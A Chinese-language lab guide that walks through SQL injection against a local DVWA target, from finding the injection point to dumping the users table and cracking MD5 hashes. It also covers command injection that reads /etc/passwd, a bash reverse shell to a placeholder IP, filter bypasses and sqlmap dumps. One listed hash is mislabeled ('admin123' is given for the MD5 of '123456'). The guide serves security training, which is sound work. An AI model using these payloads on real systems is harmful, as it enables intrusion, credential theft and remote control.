# SQL注入实战练习指南

> 本练习基于DVWA靶场，带领你完成一次完整的SQL注入攻击。
> 练习前请确保DVWA已部署并运行（`bash labs/setup-labs.sh`）。

---

## 环境准备

```bash
# 确认靶场运行中
docker ps | grep dvwa

# 浏览器访问 http://localhost:8081
# 登录：admin / password
# DVWA Security → 设置为 Low
# 左侧菜单 → SQL Injection
```

---

## 练习1：发现注入点

### 步骤1.1：正常请求

```
1. 在SQL Injection页面，User ID输入框输入：1
2. 点击Submit
3. 观察页面返回了哪个用户的信息

Expected: 页面显示ID=1的用户（通常是admin）
```

### 步骤1.2：触发错误

```
1. 输入框输入：1'
2. 点击Submit
3. 观察页面变化

Expected: 出现SQL错误信息（You have an error in your SQL syntax...）
         这证明输入被直接拼接到SQL中 → 存在SQL注入漏洞！

如果没有报错 → 尝试：
  - 1" （双引号）
  - 1 OR 1=1
```

### 步骤1.3：确认注入类型

```
输入：1 AND 1=1
Expected: 正常返回用户信息（条件为真）

输入：1 AND 1=2
Expected: 不返回用户（或返回空）→ 条件为假

两次结果不同 → 确认是数字型SQL注入
```

---

## 练习2：确定列数

### 步骤2.1：ORDER BY递增

```
在User ID输入框中依次测试：

1' ORDER BY 1 #       → 正常
1' ORDER BY 2 #       → 正常
1' ORDER BY 3 #       → 正常
1' ORDER BY 4 #       → 报错！

Expected: 报错时说明当前表只有3列
结论：当前查询返回3列数据

注意：# 是MySQL的注释符，注释掉后面的内容
```

---

## 练习3：确定回显位置

### 步骤3.1：UNION SELECT

```
1' UNION SELECT 1,2,3 #

Expected: 页面显示了数字 2 和 3（某个数字没有显示）
这说明：
  - 第1列：ID（不显示）
  - 第2列：First name（显示）
  - 第3列：Surname（显示）

第2列和第3列的位置可以用来回显数据！
```

---

## 练习4：提取数据库信息

### 步骤4.1：获取数据库名

```
1' UNION SELECT 1,database(),3 #

Expected: 页面显示数据库名（如 dvwa）
这就是当前连接的数据库名称。
```

### 步骤4.2：获取MySQL版本

```
1' UNION SELECT 1,version(),3 #

Expected: 显示MySQL版本号（如 5.5.62-0ubuntu0.14.04.1）
```

### 步骤4.3：获取当前用户

```
1' UNION SELECT 1,user(),3 #

Expected: 显示当前数据库用户名（如 root@localhost）
```

---

## 练习5：提取表名

### 步骤5.1：获取所有表

```
1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() #

Expected: 显示当前数据库中的所有表名
常见输出：guestbook, users

group_concat() 把多行数据合并成一行显示
information_schema.tables 存储了所有表的信息
```

---

## 练习6：提取列名

### 步骤6.1：获取users表的列

```
1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' #

Expected: 显示users表的所有列名
常见输出：user_id, first_name, last_name, user, password, avatar, last_login, failed_login, id, username, password, user_level

注意：可能显示两套列名（因为information_schema记录了两个系统的users表）
找到和你实际看到的数据匹配的列名。
```

---

## 练习7：提取用户数据（最终目标）

### 步骤7.1：获取用户名和密码

```
1' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users #

Expected: 显示所有用户名和密码哈希
例如：admin:5f4dcc3b5aa765d61d8327deb882cf99

解释：
  - group_concat(username,0x3a,password) → 用户名:密码 的格式
  - 0x3a 是冒号(:)的十六进制编码（用于分隔）
```

### 步骤7.2：解密密码哈希

```
1. 复制密码哈希，如：5f4dcc3b5aa765d61d8327deb882cf99
2. 访问 https://crackstation.net/ 或 https://www.cmd5.org/
3. 粘贴哈希，查询明文

Expected: 破解出明文密码（如 admin → password）

常见密码的MD5哈希（提前背诵）：
  password    → 5f4dcc3b5aa765d61d8327deb882cf99
  admin123   → e10adc3949ba59abbe56e057f20f883e
  letmein    → 0d107d09f5bbe40cade3de5c71e9e9b7
```

---

## 练习8：升级——命令行注入（Bonus）

### 步骤8.1：DVWA Command Injection页面

```
左侧菜单 → Command Injection
```

### 步骤8.2：基础注入

```
1. Ping面板中输入：127.0.0.1
2. 观察正常Ping结果

3. 注入命令：
   127.0.0.1; whoami
   → 执行whoami命令，显示当前用户

4. 更多命令：
   127.0.0.1; cat /etc/passwd
   127.0.0.1; id
   127.0.0.1; ls -la /var/www/html
   127.0.0.1; uname -a
```

### 步骤8.3：反弹Shell（高级，可跳过）

```
如果目标有外部网络访问，可以尝试反弹Shell：

攻击者机器（监听4444端口）：
nc -lvnp 4444

DVWA输入：
127.0.0.1; bash -i >& /dev/tcp/你的IP/4444 0>&1

成功后会获得一个远程Shell。

⚠️ 只在授权的靶场环境中尝试！
```

---

## 练习9：Medium级别绕过

### 步骤9.1：切换难度

```
DVWA Security → Medium → Submit
```

### 步骤9.2：观察过滤

```
在Burp Suite中拦截请求，观察：
- 参数是否被URL编码
- 是否有任何过滤（如删除单引号）

手动发送请求测试：
- 1+AND+1=1 （用+代替空格）
- 1%27+OR+1%3D1 （对单引号URL编码）
```

---

## 练习10：用sqlmap自动化（可选）

### 步骤10.1：Burp抓包保存

```
1. Burp Suite开启代理
2. DVWA SQL Injection页面发送一个请求
3. Proxy → HTTP History → 找到请求
4. 右键 → Copy to file → 保存为 request.txt
```

### 步骤10.2：sqlmap检测

```bash
sqlmap -r request.txt --cookie="PHPSESSID=你的session; security=medium" --batch

# sqlmap会自动：
# - 检测注入点
# - 识别数据库类型
# - 枚举数据库
```

### 步骤10.3：提取数据

```bash
# 获取数据库
sqlmap -r request.txt --cookie="..." --dbs --batch

# 获取表
sqlmap -r request.txt --cookie="..." -D dvwa --tables --batch

# 获取数据
sqlmap -r request.txt --cookie="..." -D dvwa -T users --dump --batch
```

---

## 完成标志

完成以上练习后，你应该能够：
- [ ] 成功在DVWA中完成从发现注入到提取数据的完整流程
- [ ] 理解ORDER BY确定列数的原理
- [ ] 理解UNION SELECT回显数据的原理
- [ ] 能用group_concat()一次性提取多行数据
- [ ] 能对MD5哈希进行简单解密
- [ ] 能识别DVWA Medium级别的简单过滤并尝试绕过
